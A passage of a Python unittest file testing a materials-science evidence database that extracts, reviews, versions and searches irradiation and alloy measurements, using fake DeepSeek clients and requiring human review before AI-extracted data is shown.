        self.assertTrue(health["ok"], health)
        self.assertEqual(health["row_count"], 1)

    def test_drafts_hidden_until_human_review(self):
        measurement = self.add_measurement()
        self.assertEqual(self.db.query_measurements(), [])
        self.db.review_measurement(measurement, "verified", "tester")
        rows = self.db.query_measurements()
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["parameter"], "hardness")

    def test_verified_requires_locator(self):
        measurement = self.db.add_measurement(
            paper_id=self.paper, category="x", parameter="x", value_raw="1", evidence_type="measured",
            source_precision="exact_text", evidence={"excerpt": "one"},
        )
        with self.assertRaisesRegex(ValueError, "require a page number"):
            self.db.review_measurement(measurement, "verified", "tester")

    def test_figure_value_cannot_be_verified(self):
        measurement = self.add_measurement(source_precision="figure_only")
        with self.assertRaisesRegex(ValueError, "Figure-only"):
            self.db.review_measurement(measurement, "verified", "tester")

    def test_measured_filter_excludes_calculated(self):
        measured = self.add_measurement()
        calculated = self.add_measurement(parameter="SRIM dose", evidence_type="calculated")
        self.db.review_measurement(measured, "verified", "tester")
        self.db.review_measurement(calculated, "verified", "tester")
        rows = self.db.query_measurements(evidence_type="measured")
        self.assertEqual([row["id"] for row in rows], [measured])

    def test_review_edit_recomputes_normalized_value(self):
        measurement = self.add_measurement()
        self.db.review_measurement(
            measurement, "verified", "tester", changes={"value_raw": "4.2±0.2", "unit_raw": "GPa"}
        )
        row = self.db.query_measurements()[0]
        self.assertEqual(row["value_num"], 4.2)
        self.assertEqual(row["uncertainty_num"], 0.2)
        self.assertEqual(row["normalized_value"], 4.2e9)
        self.assertEqual(row["normalized_unit"], "Pa")

    def test_ai_payload_validates_before_insert(self):
        payload = {
            "materials": [{"label": "W"}], "experiments": [{"label": "He", "material_label": "W"}],
            "measurements": [{
                "material_label": "W", "experiment_label": "He", "category": "microstructure", "parameter": "bubble size",
                "value_raw": "~2", "value_num": 2, "unit_raw": "nm", "evidence_type": "measured",
                "source_precision": "figure_only", "page_number": 5, "excerpt": "estimated from Fig. 2",
            }], "pending_tasks": []
        }
        path = Path(self.tmp.name) / "bad.json"
        path.write_text(json.dumps(payload), encoding="utf-8")
        with self.assertRaisesRegex(ValueError, "Figure-only"):
            import_ai_result(self.db, self.paper, path)
        with self.db.connect() as conn:
            self.assertEqual(conn.execute("SELECT COUNT(*) FROM materials").fetchone()[0], 0)


class CorpusIntegrationTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.db = EvidenceDB(Path(self.tmp.name) / "evidence.sqlite")

    def tearDown(self):
        self.tmp.cleanup()

    def test_legacy_sample_and_balanced_pilot(self):
        pilot = select_pilot(self.db, output=Path(self.tmp.name) / "pilot.csv")
        imported = import_legacy_sample(self.db)
        self.assertEqual(len(pilot), 30)
        self.assertEqual(sum(row["focus"] == "HEA-RHEA-CCA" for row in pilot), 15)
        self.assertEqual(sum(row["focus"] == "W-Refractory-Alloys" for row in pilot), 15)
        self.assertEqual(imported["measurements"], 108)
        self.assertTrue(all(Path(row["selected_pdf_path"]).is_file() for row in pilot))
        report = validate_database(self.db)
        self.assertTrue(report["ok"], report["errors"])
        self.assertEqual(report["summary"]["review"], {"draft": 108})
        with self.db.connect() as conn:
            conn.execute("UPDATE papers SET material_focus='HEA' WHERE pilot_code='P01'")
            conn.execute(
                """UPDATE papers SET material_focus='RHEA' WHERE id=(
                   SELECT id FROM papers WHERE pilot_code LIKE 'P%'
                   AND material_focus='W-Refractory-Alloys' ORDER BY pilot_code LIMIT 1)"""
            )
        alias_report = validate_database(self.db)
        self.assertTrue(alias_report["ok"], alias_report["errors"])


class SixColumnWorkflowTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.db = EvidenceDB(Path(self.tmp.name) / "six.sqlite")
        self.paper_id = self.db.upsert_paper(
            title=TARGET_TITLE, doi=TARGET_DOI, zotero_key="TESTKEY", pdf_path=__file__,
            first_author="Wei-Ying Chen", corresponding_author="Wei-Ying Chen",
        )
        self.seed = seed_target_article(self.db, Path(self.tmp.name) / "original.csv")

    def tearDown(self):
        self.tmp.cleanup()

    def test_target_extraction_has_six_editable_fields_and_provenance(self):
        self.assertEqual(self.seed["total"], 114)
        rows = list_current_data(self.db, self.paper_id)
        self.assertEqual(len(rows), 114)
        hardness = next(r for r in rows if r["stable_key"] == "table3_al0_3cocrfeni_h0")
        self.assertEqual(hardness["value_text"], "3.56±0.05")
        self.assertEqual(hardness["unit"], "GPa")
        # The evidence locator is tied to the 10-page final published PDF in
        # Zotero storage/XJZQ42XP, not the 18-page accepted manuscript.
        self.assertEqual(hardness["source_page"], 5)
        self.assertIn("Al0.3CoCrFeNi", hardness["context_explanation"])

    def test_context_chat_reads_anchor_pdf_pages_without_writing_data(self):
        pdf_path = Path(self.tmp.name) / "context.pdf"
        document = fitz.open()
        for page_no in range(1, 7):
            page = document.new_page()
            text = (
                "Methods and background for the irradiation experiment."
                if page_no != 5
                else "The samples were irradiated at 300 degrees C. Table 3 reports irradiation hardness."
            )
            page.insert_text((72, 72), f"Page {page_no}. {text}")
        document.save(pdf_path)
        document.close()
        with self.db.connect() as conn:
            conn.execute("UPDATE papers SET pdf_path=? WHERE id=?", (str(pdf_path), self.paper_id))
        item = next(row for row in list_current_data(self.db, self.paper_id) if row["source_page"] == 5)
        version_count_before = len(get_data_item(self.db, item["item_id"])["history"])

        class FakeClient:
            settings = DeepSeekSettings(api_key="fake", analysis_model="deepseek-test")

            def __init__(self):
                self.messages = []
                self.kwargs = {}

            def request_json(self, messages, **kwargs):
                self.messages = messages
                self.kwargs = kwargs
                return {
                    "answer": "该数据表示辐照实验温度，并用于界定表3硬度结果的实验条件。[PDF第5页]",
                    "evidence_pages": [5, 99],
                    "evidence_notes": ["第5页明确给出辐照温度。"],
                    "limitations": ["未提供其他温度下的对照。"],
                }

        client = FakeClient()
        result = answer_context_chat(
            self.db, entity_type="item", entity_id=item["item_id"],
            question=DEFAULT_CONTEXT_QUESTION, history=[], client=client,
        )
        self.assertIn("辐照实验温度", result["answer"])
        self.assertEqual(result["evidence_pages"], [5])
        self.assertIn(5, result["context_pages"])
        prompt = "\n".join(message["content"] for message in client.messages)
        self.assertIn("[PDF第5页]", prompt)
        self.assertIn(DEFAULT_CONTEXT_QUESTION, prompt)
        self.assertEqual(client.messages[-1]["content"], DEFAULT_CONTEXT_QUESTION)
        self.assertEqual(client.kwargs["task"], "extraction")
        self.assertEqual(result["model"], "deepseek-v4-pro")
        self.assertEqual(len(get_data_item(self.db, item["item_id"])["history"]), version_count_before)

    def test_context_chat_rejects_unknown_entity_type(self):
        with self.assertRaisesRegex(ValueError, "entity_type"):
            answer_context_chat(
                self.db, entity_type="paper", entity_id=self.paper_id,
                question="解释", client=object(),
            )

    def test_user_facing_rows_exclude_legacy_text_values_without_deleting_history(self):
        raw_rows = list_current_data(self.db, self.paper_id)
        reportable_rows = list_reportable_current_data(self.db, self.paper_id)
        self.assertEqual(len(raw_rows), 114)
        self.assertLess(len(reportable_rows), len(raw_rows))
        self.assertTrue(all(is_reportable_value_text(row["value_text"]) for row in reportable_rows))
        excluded_ids = {row["item_id"] for row in raw_rows} - {row["item_id"] for row in reportable_rows}
        self.assertTrue(excluded_ids)
        self.assertTrue(all(get_data_item(self.db, item_id)["history"] for item_id in excluded_ids))

        paper = next(item for item in list_paper_workflow_summaries(self.db) if item["id"] == self.paper_id)
        self.assertEqual(paper["six_raw_row_count"], 114)
        self.assertEqual(paper["six_row_count"], len(reportable_rows))
        self.assertEqual(paper["six_excluded_nonreportable_count"], len(excluded_ids))

    def test_review_search_and_export_share_one_reversible_fact_cluster(self):
        source = next(row for row in list_current_data(self.db, self.paper_id) if row["stable_key"] == "irradiation_temperature")
        with self.db.connect() as conn:
            cur = conn.execute(
                "INSERT INTO data_items(paper_id,stable_key,origin_type,created_at) VALUES(?,?,?,?)",
                (self.paper_id, "irradiation_temperature_duplicate", "automatic", "2026-07-13T00:00:00+00:00"),
            )
            duplicate_id = int(cur.lastrowid)
            conn.execute(
                """INSERT INTO data_versions(item_id,version_no,value_text,meaning,unit,article_title,doi,
                context_explanation,source_page,source_locator,source_excerpt,editor,edit_note,review_action,created_at)
                VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
                (
                    duplicate_id, 0, source["value_text"], "实验辐照温度", source["unit"],
                    source["article_title"], source["doi"], source["context_explanation"],
                    source["source_page"], "Methods duplicate mention", source["source_excerpt"],
                    "test", "duplicate evidence", "automatic", "2026-07-13T00:00:00+00:00",
                ),
            )
        cluster = next(
            fact for fact in list_current_facts(self.db, self.paper_id)
            if source["item_id"] in fact["fact_member_ids"]
        )
        self.assertEqual(cluster["fact_member_ids"], sorted([source["item_id"], duplicate_id]))
        self.assertEqual(cluster["fact_cluster_size"], 2)

        fields = {field: cluster[field] for field in SIX_FIELDS}
        confirmed = confirm_correction(self.db, cluster["item_id"], fields, "tester")
        self.assertEqual(confirmed["review_action"], "confirmation")
        self.assertEqual(confirmed["fact_cluster_size"], 2)
        raw_members = {
            row["item_id"]: row for row in list_current_data(self.db, self.paper_id)
            if row["item_id"] in {source["item_id"], duplicate_id}
        }
        self.assertEqual({row["review_action"] for row in raw_members.values()}, {"confirmation"})
        self.assertTrue(all(len(get_data_item(self.db, item_id)["history"]) == 2 for item_id in raw_members))

        search_hits = [
            row for row in search_current_data(self.db, "辐照温度", limit=1000)
            if source["item_id"] in row.get("fact_member_ids", [])
        ]
        export_hits = [
            row for row in search_export_rows(self.db, "辐照温度")
            if source["item_id"] in row.get("fact_member_ids", [])
        ]
        self.assertEqual(len(search_hits), 1)
        self.assertEqual(len(export_hits), 1)

    def test_legacy_prose_is_searchable_only_as_qualitative_finding(self):
        numeric_ids = {row["item_id"] for row in search_current_data(self.db, "空洞", limit=1000)}
        findings = search_qualitative_findings(self.db, "空洞", limit=1000)
        self.assertTrue(findings)
        self.assertTrue(all(not is_reportable_value_text(row["finding_text"]) for row in findings))
        self.assertTrue(all(row["item_id"] not in numeric_ids for row in findings))
        self.assertEqual(
            {row["finding_id"] for row in findings},
            {row["finding_id"] for row in list_qualitative_findings(self.db, self.paper_id) if "空洞" in row["search_text"]},
        )

    def test_target_visual_index_renders_complete_tables_and_figures(self):
        result = index_visual_evidence(self.db, self.paper_id)
        self.assertEqual(result["table_count"], 4)
        self.assertEqual(result["figure_count"], 10)
        self.assertEqual(result["links"]["asset_count"], 14)
        assets = list_visual_assets(self.db, paper_id=self.paper_id)
        self.assertEqual(len(assets), 14)
        table3 = next(asset for asset in assets if asset["label"] == "Table 3")
        self.assertIn("辐照后硬度", table3["physical_quantities"])
        self.assertTrue(visual_asset_image_path(self.db, table3["id"]).is_file())
        self.assertTrue(visual_asset_image_path(self.db, table3["id"]).read_bytes().startswith(b"\x89PNG"))
        self.assertEqual(get_visual_asset(self.db, table3["id"])["caption"], table3["caption"])

    def test_visual_review_is_versioned_without_changing_original_screenshot(self):
        result = index_visual_evidence(self.db, self.paper_id)
        table = next(asset for asset in result["assets"] if asset["label"] == "Table 3")
        image_sha = table["image_sha256"]
        fields = {key: table[key] for key in (
            "display_name", "physical_quantities", "variables", "materials", "conditions_text",
            "methods_text", "context_explanation", "tags",
        )}
        fields["context_explanation"] = "人工核对：该表集中比较三种材料的辐照前后硬度。"
        reviewed = review_visual_asset(
            self.db, table["id"], fields, "confirmation", reviewer="tester", note="核对表头和正文"
        )
        self.assertEqual(reviewed["review_action"], "correction")
        self.assertEqual(reviewed["version_no"], 1)
        self.assertEqual(reviewed["image_sha256"], image_sha)
        self.assertEqual(reviewed["original_context_explanation"], table["context_explanation"])
        self.assertEqual(reviewed["context_explanation"], fields["context_explanation"])
        reopened = review_visual_asset(self.db, table["id"], fields, "automatic")
        self.assertEqual(reopened["review_action"], "automatic")
        self.assertEqual(reopened["version_no"], 2)

    def test_deepseek_visual_metadata_keeps_caption_and_adds_short_chinese_name(self):
        result = index_visual_evidence(self.db, self.paper_id)
        original_captions = {asset["id"]: asset["caption"] for asset in result["assets"]}

        class FakeVisualClient:
            def request_json(self, messages, **kwargs):
                request = json.loads(messages[-1]["content"])
                return {"assets": [{
                    "asset_id": asset["asset_id"],
                    "display_name": f"{asset['label']} 辐照结果",
                    "context_explanation": "依据原始图注，用于比较辐照条件下的实验结果。",
                    "physical_quantities": ["辐照响应"],
                    "variables": {}, "materials": [], "conditions_text": "",
                    "methods_text": "", "tags": ["辐照响应", asset["label"]],
                } for asset in request["visual_evidence"]]}

        summary = enrich_visual_metadata(self.db, self.paper_id, client=FakeVisualClient(), batch_size=5)
        self.assertEqual(summary["updated"], 14)
        assets = list_visual_assets(self.db, paper_id=self.paper_id)
        self.assertTrue(all(asset["metadata_source"] == "deepseek" for asset in assets))
        self.assertTrue(all(asset["display_name"].endswith("辐照结果") for asset in assets))
        self.assertEqual({asset["id"]: asset["caption"] for asset in assets}, original_captions)
        index_visual_evidence(self.db, self.paper_id)
        reindexed = list_visual_assets(self.db, paper_id=self.paper_id)
        self.assertTrue(all(asset["metadata_source"] == "deepseek" for asset in reindexed))
        self.assertTrue(all(asset["display_name"].endswith("辐照结果") for asset in reindexed))

        changed = reindexed[0]
        with self.db.connect() as conn:
            conn.execute(
                "UPDATE visual_assets SET caption=? WHERE id=?",
                ("stale caption from a false PDF reference", changed["id"]),
            )
        index_visual_evidence(self.db, self.paper_id)
        corrected = get_visual_asset(self.db, changed["id"])
        self.assertEqual(corrected["metadata_source"], "deterministic")
        self.assertFalse(corrected["display_name"].endswith("辐照结果"))

    def test_qualitative_finding_allows_paper_without_doi(self):
        paper_id = self.db.upsert_paper(
            title="Historic experiment without DOI",
            doi=None,
            pdf_path=self.db.get_paper(self.paper_id)["pdf_path"],
        )
        item = add_qualitative_item(self.db, paper_id, {
            "finding_text": "no voids were observed after irradiation",
            "meaning": "辐照后空洞观察结果",
            "context_explanation": "历史实验论文；TEM观察；无 DOI",
            "source_page": 3,
            "source_locator": "Results",
            "source_excerpt": "no voids were observed after irradiation",
        })
        self.assertEqual(item["doi"], "")
        self.assertEqual(item["article_title"], "Historic experiment without DOI")

    def test_visual_search_and_item_source_kinds_stay_distinct(self):
        index_visual_evidence(self.db, self.paper_id)
        table_hits = search_visual_assets(self.db, "纳米硬度", asset_type="table")
        figure_hits = search_visual_assets(self.db, "位错环密度 随剂量", asset_type="figure")
        self.assertEqual(table_hits[0]["label"], "Table 3")
        self.assertEqual(figure_hits[0]["label"], "Figure 8")
        rows = list_current_data(self.db, self.paper_id)
        table_row = next(row for row in rows if row["stable_key"] == "table3_al0_3cocrfeni_h0")
        text_row = next(row for row in rows if row["stable_key"] == "irradiation_temperature")
        figure_related = next(row for row in rows if row["stable_key"] == "obs_loop_saturation")
        self.assertEqual(table_row["source_kind"], "table")
        self.assertEqual(table_row["primary_visual_asset"]["label"], "Table 3")
        self.assertEqual(text_row["source_kind"], "text")
        self.assertEqual(figure_related["source_kind"], "text_with_figure")
        self.assertEqual(search_current_data(self.db, "Table 3", limit=100)[0]["primary_visual_asset"]["label"], "Table 3")

    def test_benchmark_reads_saved_run_without_model_call_and_writes_reports(self):
        artifact = (
            Path(__file__).resolve().parents[2]
            / "data/evidence/deepseek_runs/paper_002_run_0008.json"
        )
        report = benchmark_extraction_run(
            self.db,
            TARGET_DOI,
            artifact_path=artifact,
            out_dir=Path(self.tmp.name) / "benchmark",
        )
        summary = report["summary"]
        self.assertEqual(summary["baseline_count"], 114)
        self.assertEqual(report["postprocessing_replay"]["raw_candidate_count"], 125)
        self.assertLess(summary["candidate_count"], 125)
        self.assertTrue(report["postprocessing_replay"]["artifact_unchanged"])
        self.assertGreater(summary["candidate_match_count"], 0)
        self.assertTrue(summary["provisional"])
        self.assertTrue(report["generated_without_model_call"])
        self.assertTrue(Path(report["json_path"]).is_file())
        markdown = Path(report["markdown_path"]).read_text(encoding="utf-8")
        self.assertIn("不等同于科学准确率", markdown)
        self.assertIn("优先人工检查的未匹配候选", markdown)

    def test_ensemble_preview_adds_only_focused_supplement_without_database_writes(self):
        before = len(list_current_data(self.db, self.paper_id))
        run_dir = Path(__file__).resolve().parents[2] / "data/evidence/deepseek_runs"
        report = benchmark_ensemble_preview(
            self.db,
            TARGET_DOI,
            primary_run_id=23,
            supplemental_run_ids=[24],
            primary_artifact_path=run_dir / "paper_002_run_0023.json",
            supplemental_artifact_paths={24: run_dir / "paper_002_run_0024.json"},
            out_dir=Path(self.tmp.name) / "ensemble",
        )
        self.assertEqual(report["ensemble"]["supplemental_candidate_counts"], {"24": 4})
        self.assertEqual(report["ensemble"]["database_rows_changed"], 0)
        self.assertGreaterEqual(report["summary"]["baseline_coverage_rate"], 0.85)
        self.assertLessEqual(report["summary"]["candidate_count"], 155)
        self.assertEqual(len(list_current_data(self.db, self.paper_id)), before)
        self.assertTrue(Path(report["json_path"]).is_file())

    def test_ensemble_accepts_multiple_safe_focus_aliases(self):
        before = len(list_current_data(self.db, self.paper_id))
        run_dir = Path(__file__).resolve().parents[2] / "data/evidence/deepseek_runs"
        report = benchmark_ensemble_preview(
            self.db,
            TARGET_DOI,
            primary_run_id=23,
            supplemental_run_ids=[25],
            supplemental_focus=["coverage_gap_audit", "results"],
            primary_artifact_path=run_dir / "paper_002_run_0023.json",
            supplemental_artifact_paths={25: run_dir / "paper_002_run_0025.json"},
            out_dir=Path(self.tmp.name) / "multi-focus-ensemble",
        )
        self.assertEqual(
            report["ensemble"]["supplemental_focuses"],
            ["coverage_gap_audit", "results"],
        )
        self.assertEqual(report["ensemble"]["supplemental_candidate_counts"], {"25": 31})
        self.assertEqual(report["ensemble"]["database_rows_changed"], 0)
        self.assertEqual(len(list_current_data(self.db, self.paper_id)), before)

    def test_ensemble_qualitative_focus_keeps_only_numeric_trend_results(self):
        run_dir = Path(__file__).resolve().parents[2] / "data/evidence/deepseek_runs"
        report = benchmark_ensemble_preview(
            self.db,
            TARGET_DOI,
            primary_run_id=23,
            supplemental_run_ids=[25],
            supplemental_focus=["coverage_gap_audit", "qualitative_results"],
            primary_artifact_path=run_dir / "paper_002_run_0023.json",
            supplemental_artifact_paths={25: run_dir / "paper_002_run_0025.json"},
            out_dir=Path(self.tmp.name) / "qualitative-ensemble",
        )
        self.assertGreater(report["ensemble"]["supplemental_candidate_counts"]["25"], 6)
        self.assertLess(report["ensemble"]["supplemental_candidate_counts"]["25"], 31)
        self.assertEqual(report["category_coverage"]["显微观察与趋势"]["covered"], 2)

    def test_ensemble_can_select_composition_table_candidates_by_semantics(self):
        run_dir = Path(__file__).resolve().parents[2] / "data/evidence/deepseek_runs"
        report = benchmark_ensemble_preview(
            self.db,
            TARGET_DOI,
            primary_run_id=23,
            supplemental_run_ids=[26],
            supplemental_focus="composition_table",
            primary_artifact_path=run_dir / "paper_002_run_0023.json",
            supplemental_artifact_paths={26: run_dir / "paper_002_run_0026.json"},
            out_dir=Path(self.tmp.name) / "composition-ensemble",
        )
        self.assertGreater(report["ensemble"]["supplemental_candidate_counts"]["26"], 30)
        self.assertGreaterEqual(report["category_coverage"]["材料成分"]["covered"], 37)
        self.assertEqual(report["ensemble"]["database_rows_changed"], 0)

    def test_ensemble_can_assign_different_focuses_to_each_supplemental_run(self):
        run_dir = Path(__file__).resolve().parents[2] / "data/evidence/deepseek_runs"
        report = benchmark_ensemble_preview(
            self.db,
            TARGET_DOI,
            primary_run_id=23,
            supplemental_run_ids=[25, 26],
            supplemental_focus_by_run={
                25: ["coverage_gap_audit", "qualitative_results"],
                26: ["composition_table"],
            },
            primary_artifact_path=run_dir / "paper_002_run_0023.json",
            supplemental_artifact_paths={
                25: run_dir / "paper_002_run_0025.json",
                26: run_dir / "paper_002_run_0026.json",
            },
            out_dir=Path(self.tmp.name) / "per-run-ensemble",
        )
        self.assertEqual(
            report["ensemble"]["supplemental_focuses_by_run"],
            {"25": ["coverage_gap_audit", "qualitative_results"], "26": ["composition_table"]},
        )
        self.assertEqual(report["ensemble"]["supplemental_candidate_counts"], {"25": 14, "26": 60})
        self.assertGreaterEqual(report["summary"]["baseline_coverage_rate"], 0.90)
        self.assertEqual(report["ensemble"]["database_rows_changed"], 0)

    def test_confirmed_correction_does_not_mutate_original(self):
        row = next(r for r in list_current_data(self.db) if r["stable_key"] == "irradiation_temperature")
        changed = {field: row[field] for field in ("value_text", "meaning", "unit", "article_title", "doi", "context_explanation")}
        changed["context_explanation"] += "；人工确认"
        revised = confirm_correction(self.db, row["item_id"], changed, "tester", "context correction")
        self.assertEqual(revised["version_no"], 1)
        self.assertTrue(revised["context_explanation"].endswith("人工确认"))
        self.assertFalse(revised["original_context_explanation"].endswith("人工确认"))
        self.assertEqual(revised["original_value_text"], "300")
        self.assertEqual(revised["review_action"], "correction")
        export_path = export_original_csv(self.db, Path(self.tmp.name) / "after-correction.csv")
        with export_path.open(encoding="utf-8-sig", newline="") as handle:
            exported = next(row for row in csv.DictReader(handle) if row["stable_key"] == "irradiation_temperature")
        self.assertEqual(exported["context_explanation"], row["original_context_explanation"])
        self.assertNotIn("人工确认", exported["context_explanation"])

    def test_unchanged_row_can_be_confirmed_as_positive_learning_sample(self):
        row = next(r for r in list_current_data(self.db) if r["stable_key"] == "tem_voltage")
        fields = {field: row[field] for field in ("value_text", "meaning", "unit", "article_title", "doi", "context_explanation")}
        confirmed = confirm_correction(self.db, row["item_id"], fields, "tester", "人工确认：内容无修改")
        self.assertEqual(confirmed["version_no"], 1)
        self.assertEqual(confirmed["review_action"], "confirmation")
        self.assertEqual(confirmed["original_value_text"], confirmed["value_text"])
        learning = collect_learning_samples(self.db, self.paper_id)
        self.assertEqual(learning["confirmation_count"], 1)
        self.assertEqual(learning["correction_count"], 0)
        sample = learning["samples"][0]
        self.assertEqual(sample["sample_type"], "confirmation")
        self.assertEqual(sample["changed_fields"], [])

    def test_optional_reviewer_note_reaches_history_and_learning_guidance(self):
        row = next(r for r in list_current_data(self.db) if r["stable_key"] == "tem_voltage")
        fields = {field: row[field] for field in SIX_FIELDS}
        note = "人工确认：内容无修改；人工核验备注：单位来自实验方法段"
        confirmed = confirm_correction(self.db, row["item_id"], fields, "tester", note)

        self.assertEqual(confirmed["edit_note"], note)
        samples = collect_learning_samples(self.db, self.paper_id)
        self.assertEqual(samples["samples"][0]["edit_note"], note)
        report = build_learning_report(self.db, self.paper_id)
        self.assertIn("单位来自实验方法段", report["guidance_preview"])

    def test_confirmation_and_correction_can_return_to_pending_without_losing_history(self):
        confirmed_row = next(r for r in list_current_data(self.db) if r["stable_key"] == "tem_voltage")
        confirmed_fields = {field: confirmed_row[field] for field in SIX_FIELDS}
        confirmed = confirm_correction(self.db, confirmed_row["item_id"], confirmed_fields, "tester")

        corrected_row = next(r for r in list_current_data(self.db) if r["stable_key"] == "irradiation_temperature")
        corrected_fields = {field: corrected_row[field] for field in SIX_FIELDS}
        corrected_fields["context_explanation"] += "；人工修正后待复查"
        corrected = confirm_correction(self.db, corrected_row["item_id"], corrected_fields, "tester")

        reopened_confirmation = set_row_review_decision(
            self.db, confirmed["item_id"], "automatic", note="撤销误确认", editor="tester",
        )
        reopened_correction = set_row_review_decision(
            self.db, corrected["item_id"], "automatic", note="修正仍需复查", editor="tester",
        )

        self.assertEqual(reopened_confirmation["review_action"], "automatic")
        self.assertEqual(reopened_correction["review_action"], "automatic")
        self.assertEqual(reopened_confirmation["version_no"], 2)
        self.assertEqual(reopened_correction["version_no"], 2)
        self.assertEqual(reopened_correction["context_explanation"], corrected_fields["context_explanation"])
        self.assertEqual(reopened_correction["original_context_explanation"], corrected_row["original_context_explanation"])
        self.assertEqual(collect_learning_samples(self.db, self.paper_id)["sample_count"], 0)
        progress = review_progress(self.db, self.paper_id)
        self.assertEqual(progress["reviewed"], 0)
        self.assertEqual(progress["unreviewed"], len(list_reportable_current_data(self.db, self.paper_id)))

    def test_rejection_and_ambiguity_are_reversible_negative_learning_samples(self):
        rejected_row = next(r for r in list_current_data(self.db) if r["stable_key"] == "irradiation_temperature")
        ambiguous_row = next(r for r in list_current_data(self.db) if r["stable_key"] == "tem_voltage")
        rejected = set_row_review_decision(
            self.db, rejected_row["item_id"], "rejected",
            reason_code="不是本文报告的实验数据", note="测试负例", editor="tester",
        )
        ambiguous = set_row_review_decision(
            self.db, ambiguous_row["item_id"], "ambiguous",
            reason_code="样品或实验条件对应不明确", note="测试歧义", editor="tester",
        )
        self.assertEqual(rejected["review_action"], "rejected")
        self.assertEqual(ambiguous["review_action"], "ambiguous")
        self.assertEqual(rejected["original_value_text"], rejected_row["original_value_text"])
        self.assertEqual(ambiguous["original_value_text"], ambiguous_row["original_value_text"])

        progress = review_progress(self.db, self.paper_id)
        self.assertEqual(progress["rejected"], 1)
        self.assertEqual(progress["ambiguous"], 1)
        self.assertEqual(progress["reviewed"], 2)
        reportable_total = len(list_reportable_current_data(self.db, self.paper_id))
        self.assertEqual(progress["unreviewed"], reportable_total - 2)
        learning = collect_learning_samples(self.db, self.paper_id)
        self.assertEqual(learning["rejected_count"], 1)
        self.assertEqual(learning["ambiguous_count"], 1)
        self.assertEqual({sample["sample_type"] for sample in learning["samples"]}, {"rejection", "ambiguity"})
        report = build_learning_report(self.db, self.paper_id)
        self.assertIn("AVOID_CANDIDATE", report["guidance_preview"])
        self.assertIn("ROUTE_TO_PENDING_TASK_UNLESS_RESOLVED", report["guidance_preview"])

        normal_ids = {row["item_id"] for row in search_current_data(self.db, "辐照温度", limit=1000)}
        all_ids = {row["item_id"] for row in search_current_data(self.db, "辐照温度", limit=1000, include_excluded=True)}
        self.assertNotIn(rejected_row["item_id"], normal_ids)
        self.assertIn(rejected_row["item_id"], all_ids)
        papers = {row["id"]: row for row in self.db.list_papers()}
        self.assertEqual(papers[self.paper_id]["six_rejected_count"], 1)
        self.assertEqual(papers[self.paper_id]["six_ambiguous_count"], 1)

        reopened = set_row_review_decision(
            self.db, rejected_row["item_id"], "automatic", note="恢复待审核", editor="tester",
        )
        self.assertEqual(reopened["review_action"], "automatic")
        self.assertGreater(reopened["version_no"], rejected["version_no"])
        self.assertEqual(review_progress(self.db, self.paper_id)["unreviewed"], reportable_total - 1)

    def test_review_progress_counts_unreviewed_confirmed_corrected_and_manual_rows(self):
        automatic_confirmed = next(r for r in list_current_data(self.db) if r["stable_key"] == "tem_voltage")
        confirm_correction(
            self.db,
            automatic_confirmed["item_id"],
            {field: automatic_confirmed[field] for field in ("value_text", "meaning", "unit", "article_title", "doi", "context_explanation")},
            "tester",
            "确认无修改",
        )
        automatic_corrected = next(r for r in list_current_data(self.db) if r["stable_key"] == "irradiation_temperature")
        changed = {field: automatic_corrected[field] for field in ("value_text", "meaning", "unit", "article_title", "doi", "context_explanation")}
        changed["context_explanation"] += "；补充审核备注"
        confirm_correction(self.db, automatic_corrected["item_id"], changed, "tester", "补充上下文")
        add_manual_item(self.db, self.paper_id, {
            "value_text": "42", "meaning": "人工新增验证量", "unit": "a.u.",
            "article_title": TARGET_TITLE, "doi": TARGET_DOI,
            "context_explanation": "人工补录；用于核验进度统计",
        })
        progress = review_progress(self.db, self.paper_id)
        reportable_total = len(list_reportable_current_data(self.db, self.paper_id))
        self.assertEqual(progress["total"], reportable_total)
        self.assertEqual(progress["confirmed"], 1)
        self.assertEqual(progress["corrected"], 1)
        self.assertEqual(progress["rejected"], 0)
        self.assertEqual(progress["ambiguous"], 0)
        self.assertEqual(progress["manual"], 1)
        self.assertEqual(progress["reviewed"], 3)
        self.assertEqual(progress["unreviewed"], reportable_total - 3)
        self.assertAlmostEqual(progress["reviewed_ratio"], round(3 / reportable_total, 4))

    def test_manual_entry_has_no_automatic_original(self):
        manual = add_manual_item(self.db, self.paper_id, {
            "value_text": "42", "meaning": "人工测试量", "unit": "a.u.",
            "article_title": TARGET_TITLE, "doi": TARGET_DOI,
            "context_explanation": "人工补录；搜索测试；CoCrFeMnNi",
        })
        self.assertEqual(manual["origin_type"], "manual")
        self.assertEqual(manual["review_action"], "manual")
        self.assertIsNone(manual["original_value_text"])

    def test_fuzzy_search_prioritizes_context(self):
        results = search_current_data(self.db, "CoCrFeMnN 辐照后 硬度")
        self.assertTrue(results)
        self.assertIn("CoCrFeMnNi", results[0]["context_explanation"])
        self.assertIn("硬度", results[0]["meaning"])

    def test_search_prioritizes_specific_meaning_above_article_context(self):
        meaning_match = add_manual_item(self.db, self.paper_id, {
            "value_text": "300", "meaning": "温度", "unit": "°C",
            "article_title": TARGET_TITLE, "doi": TARGET_DOI,
            "context_explanation": "测试样品；一般实验条件",
        })
        context_match = add_manual_item(self.db, self.paper_id, {
            "value_text": "3.5", "meaning": "硬度", "unit": "GPa",
            "article_title": TARGET_TITLE, "doi": TARGET_DOI,
            "context_explanation": "测试样品；温度",
        })
        results = search_current_data(self.db, "温度")
        ids = [row["item_id"] for row in results]
        self.assertLess(ids.index(meaning_match["item_id"]), ids.index(context_match["item_id"]))
        by_id = {row["item_id"]: row for row in results}
        self.assertGreater(
            by_id[meaning_match["item_id"]]["search_score"],
            by_id[context_match["item_id"]]["search_score"],
        )

    def test_search_spans_multiple_papers(self):
        other = self.db.upsert_paper(title="Other irradiation paper", doi="10.1/search-other")
        other_row = add_manual_item(self.db, other, {
            "value_text": "500", "meaning": "辐照温度", "unit": "°C",
            "article_title": "Other irradiation paper", "doi": "10.1/search-other",
            "context_explanation": "W合金；He辐照；跨文章搜索测试",
        })
        results = search_current_data(self.db, "辐照温度", limit=1000)
        paper_ids = {row["paper_id"] for row in results}
        self.assertIn(self.paper_id, paper_ids)
        self.assertIn(other, paper_ids)
        self.assertIn(other_row["item_id"], {row["item_id"] for row in results})

    def test_multi_paper_scope_is_shared_by_data_findings_visuals_and_exports(self):
        other = self.db.upsert_paper(title="Scoped irradiation paper", doi="10.1/scoped-other")
